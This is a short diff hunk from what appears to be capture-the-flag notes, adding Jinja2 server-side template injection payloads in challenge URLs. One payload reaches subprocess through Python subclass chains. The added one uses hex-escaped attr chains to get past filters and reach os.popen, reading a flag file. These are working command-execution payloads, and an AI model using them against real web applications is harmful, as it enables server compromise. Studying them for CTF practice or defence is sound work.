@@ -49,4 +49,7 @@ Then inject the second payload : `{{config.from_object('os')}}
 ctf payloads
 
 http://chall.battlectf.online:8085/?capital={{%20().__class__.__base__.__subclasses__()[354](%22cat%20flag.txt%22,%20shell=True,%20stdout=-1).communicate()[0].strip()}}
+
+SSTI with bypass
+http://chall.battlectf.online:8086/?capital={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f%27)(%27os%27)|attr(%27\x70\x6f\x70\x65\x6e%27)(%27cat%20flag\x2etxt%27)|attr(%27read%27)()}}
 ```
